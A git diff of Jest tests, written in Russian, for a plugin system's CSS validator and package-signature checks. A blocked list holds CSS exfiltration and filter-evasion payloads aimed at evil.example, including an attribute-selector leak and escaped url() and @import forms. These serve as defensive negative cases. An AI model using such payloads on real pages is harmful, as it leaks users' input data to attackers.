@@ -167,6 +167,41 @@ test('аудит: Node, eval, сеть, cookie и CSS блокируются', (
   expect(validateCss('@import "https://evil.example/x.css";').ok).toBe(false);
 });
 
+test('CSS: внешние адреса не проходят через image-set, src() и экранирование', () => {
+  const allowed = [
+    'a { background: url(data:image/png;base64,AAAA) }',
+    'a { background-image: image-set("data:image/png;base64,AA" 1x) }',
+    'a { background: url(/static/x.png) }',
+    'a { filter: url(#glow) }',
+    'a::before { content: "\\2014" }',
+  ];
+  for (const css of allowed) expect(validateCss(css).ok, css).toBe(true);
+
+  const blocked = [
+    'a { background-image: image-set("https://evil.example/a" 1x) }',
+    "input[value^='a'] { background: -webkit-image-set('//evil.example/a' 1x) }",
+    '@font-face { font-family: x; src: src("https://evil.example/f") }',
+    'a { background: u\\72l(https://evil.example/a) }',
+    'a { background: url(ht\\74 tp://evil.example/a) }',
+    'a { background: url("/\\\\evil.example/a") }',
+    'a { background: url(/**/https://evil.example/a) }',
+    '@\\69mport "x.css";',
+  ];
+  for (const css of blocked) expect(validateCss(css).ok, css).toBe(false);
+
+  // То же правило работает и при установке пакета.
+  const report = scanFiles(
+    new Map([
+      ['plugin.json', Buffer.from(JSON.stringify(rawManifest()))],
+      ['index.js', Buffer.from("octo.notify('ok');")],
+      ['style.css', Buffer.from('a { background: image-set("https://evil.example/a" 1x) }')],
+    ]),
+    manifestWith(),
+  );
+  expect(report.verdict).toBe('blocked');
+  expect(report.findings.map((finding) => finding.rule)).toContain('css-remote-url');
+});
+
 test('решение об установке учитывает подпись и настройки', () => {
   const safeReport = { verdict: 'safe' };
   const blockedReport = { verdict: 'blocked' };
@@ -302,7 +337,7 @@ test('расширенный аудит: все 13 прав, комментар�
   const crypto = require('node:crypto');
   const { applySettings } = require('../src/main/plugins/manifest');
   const {
-    createSignatureManifest,
+    createLegacySignatureManifest,
     parseAndVerifySignatureFile,
   } = require('../src/main/plugins/signature');
   const { inspectPackage } = require('../src/main/plugins/installer');
@@ -383,7 +418,7 @@ test('расширенный аудит: все 13 прав, комментар�
   expect(badMod.verdict).toBe('blocked');
   expect(badMod.findings.map((f) => f.rule)).toContain('external-import');
 
-  // 5. Встроенная подпись SIGNATURE.json проверяется без registry.json.
+  // 5. Старая встроенная подпись SIGNATURE.json проверяется без registry.json.
   const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
   const pubPem = publicKey.export({ type: 'spki', format: 'pem' }).toString();
   const privPem = privateKey.export({ type: 'pkcs8', format: 'pem' }).toString();
@@ -391,7 +426,7 @@ test('расширенный аудит: все 13 прав, комментар�
     ['plugin.json', Buffer.from(JSON.stringify(rawManifest()))],
     ['index.js', Buffer.from('octo.notify("signed");')],
   ]);
-  const sigText = createSignatureManifest(privPem, {
+  const sigText = createLegacySignatureManifest(privPem, {
     id: 'app.octo.test',
     version: '1.0.0',
     files: pkgFiles,
@@ -417,4 +452,148 @@ test('расширенный аудит: все 13 прав, комментар�
   const tampered = inspectPackage(tamperedZip, { publicKeys: [pubPem] });
   expect(tampered.ok).toBe(true);
   expect(tampered.signature).toBe('invalid');
+});
+
+test('подпись OCTO-SIGNATURE.json: доверенный ключ, чужой ключ, подмена и старые приложения', () => {
+  const crypto = require('node:crypto');
+  const {
+    SIGNATURE_FILE,
+    createSignatureManifest,
+    verifyEmbeddedSignature,
+  } = require('../src/main/plugins/signature');
+  const { keyId } = require('../src/main/plugins/plugin-trust');
+  const { inspectPackage } = require('../src/main/plugins/installer');
+
+  const pair = () => {
+    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
+    return {
+      pub: publicKey.export({ type: 'spki', format: 'pem' }).toString(),
+      priv: privateKey.export({ type: 'pkcs8', format: 'pem' }).toString(),
+    };
+  };
+  const octo = pair();
+  const stranger = pair();
+  const signed = (priv, code = 'octo.notify("signed");') => {
+    const files = new Map([
+      ['plugin.json', Buffer.from(JSON.stringify(rawManifest()))],
+      ['index.js', Buffer.from(code)],
+    ]);
+    files.set(
+      SIGNATURE_FILE,
+      Buffer.from(createSignatureManifest(priv, { id: 'app.octo.test', version: '1.0.0', files })),
+    );
+    return files;
+  };
+  const meta = { id: 'app.octo.test', version: '1.0.0' };
+
+  const doc = JSON.parse(signed(octo.priv).get(SIGNATURE_FILE).toString('utf8'));
+  expect(doc.schema).toBe(2);
+  expect(doc.keyId).toBe(keyId(octo.pub));
+
+  // Ключ из trusted-keys: официальный пакет.
+  const ok = inspectPackage(createZip(signed(octo.priv)), { publicKeys: [octo.pub] });
+  expect(ok.signature).toBe('verified');
+  expect(ok.signatureNote).toBe('');
+
+  // Подмена файла после подписи — недействительна, установка запрещена.
+  const tamperedFiles = signed(octo.priv);
+  tamperedFiles.set('index.js', Buffer.from('octo.notify("tampered");'));
+  expect(verifyEmbeddedSignature(tamperedFiles, meta, [octo.pub]).status).toBe('invalid');
+  // Подмена keyId не помогает: подпись не сходится с доверенным ключом.
+  const forged = signed(stranger.priv);
+  const forgedDoc = JSON.parse(forged.get(SIGNATURE_FILE).toString('utf8'));
+  forged.set(SIGNATURE_FILE, Buffer.from(JSON.stringify({ ...forgedDoc, keyId: keyId(octo.pub) })));
+  expect(verifyEmbeddedSignature(forged, meta, [octo.pub]).status).toBe('invalid');
+
+  // Чужой ключ и пустой список ключей — «без подписи», а не блокировка.
+  const unknown = inspectPackage(createZip(signed(stranger.priv)), { publicKeys: [octo.pub] });
+  expect(unknown.ok).toBe(true);
+  expect(unknown.signature).toBe('unsigned');
+  expect(unknown.signatureNote).toBe('unknown-key');
+  expect(verifyEmbeddedSignature(signed(octo.priv), meta, []).status).toBe('unsigned');
+
+  // Приложение до этой версии знает только SIGNATURE.json: новый файл для него —
+  // обычный файл пакета, и плагин ставится как неподписанный.
+  const oldApp = inspectPackage(createZip(signed(octo.priv)), { publicKeys: [] });
+  expect(oldApp.ok).toBe(true);
+  expect(oldApp.files.has(SIGNATURE_FILE)).toBe(true);
+});
+
+test('доверенные ключи: только публичные Ed25519, предупреждение для неподписанных', () => {
+  const crypto = require('node:crypto');
+  const fs = require('node:fs');
+  const os = require('node:os');
+  const path = require('node:path');
+  const {
+    loadTrustedKeys,
+    trustNotice,
+    needsTrustWarning,
+  } = require('../src/main/plugins/plugin-trust');
+  const { describePermissions } = require('../src/main/plugins/permissions');
+
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'octo-keys-'));
+  const ed = crypto.generateKeyPairSync('ed25519');
+  const rsa = crypto.generateKeyPairSync('rsa', { modulusLength: 1024 });
+  fs.writeFileSync(path.join(dir, 'a.pem'), ed.publicKey.export({ type: 'spki', format: 'pem' }));
+  fs.writeFileSync(path.join(dir, 'b.pem'), ed.publicKey.export({ type: 'spki', format: 'pem' }));
+  fs.writeFileSync(path.join(dir, 'c.pem'), ed.privateKey.export({ type: 'pkcs8', format: 'pem' }));
+  fs.writeFileSync(path.join(dir, 'd.pem'), rsa.publicKey.export({ type: 'spki', format: 'pem' }));
+  fs.writeFileSync(path.join(dir, 'e.pem'), 'мусор');
+  const keys = loadTrustedKeys(dir);
+  expect(keys.map((key) => key.file)).toEqual(['a.pem']);
+  expect(loadTrustedKeys(path.join(dir, 'нет'))).toEqual([]);
+  fs.rmSync(dir, { recursive: true, force: true });
+
+  const risky = { signature: 'unsigned', permissions: describePermissions(['page:script']) };
+  expect(needsTrustWarning(risky)).toBe(true);
+  expect(trustNotice(risky).join('\n')).toContain('Скрипты на странице');
+  const mild = { signature: 'unsigned', permissions: describePermissions(['page:css']) };
+  expect(needsTrustWarning(mild)).toBe(false);
+  expect(trustNotice(mild)).toEqual([
+    'Плагин не подписан. Устанавливайте, только если доверяете автору и исходникам.',
+  ]);
+  expect(trustNotice({ ...mild, signatureNote: 'unknown-key' })[0]).toContain('не доверяет');
+  expect(needsTrustWarning({ ...risky, signature: 'verified' })).toBe(false);
+  expect(trustNotice({ ...risky, signature: 'verified' })[0]).toContain('Официальный');
+});
+
+test('скрипты подписи: без ключа не собирают, чужой ключ роняет проверку', () => {
+  const crypto = require('node:crypto');
+  const fs = require('node:fs');
+  const os = require('node:os');
+  const path = require('node:path');
+  const { spawnSync } = require('node:child_process');
+  const root = path.join(__dirname, '..');
+  const run = (script, args, env = {}) =>
+    spawnSync(process.execPath, [path.join(root, 'scripts', script), ...args], {
+      cwd: root,
+      encoding: 'utf8',
+      env: { ...process.env, OCTO_PLUGIN_SIGNING_KEY: '', ...env },
+    });
+
+  const out = fs.mkdtempSync(path.join(os.tmpdir(), 'octo-sign-'));
+  try {
+    const noKey = run('pack-official-plugins.js', ['--out', out]);
+    expect(noKey.status).not.toBe(0);
+    expect(noKey.stderr).toContain('OCTO_PLUGIN_SIGNING_KEY не задан');
+    expect(fs.readdirSync(out)).toEqual([]);
+
+    // Секрет из Actions приходит самим PEM; ключ не из trusted-keys/ не должен
+    // дать «официальный» пакет.
+    const { privateKey } = crypto.generateKeyPairSync('ed25519');
+    const pem = privateKey.export({ type: 'pkcs8', format: 'pem' }).toString();
+    const stranger = run('pack-official-plugins.js', ['--out', out, '--only', 'app.octo.hello'], {
+      OCTO_PLUGIN_SIGNING_KEY: pem,
+    });
+    expect(stranger.status).not.toBe(0);
+    expect(stranger.stderr).toContain('подписан ключом, которого нет');
+    expect(stranger.stdout).not.toContain('PRIVATE KEY');
+    expect(fs.readdirSync(out)).toEqual(['app.octo.hello-1.0.0.octoplugin']);
+
+    // Неподписанные пакеты в репозитории CI пропускает, но перечисляет.
+    const repo = run('verify-plugin-packages.js', []);
+    expect(repo.status, repo.stderr).toBe(0);
+  } finally {
+    fs.rmSync(out, { recursive: true, force: true });
+  }
 });
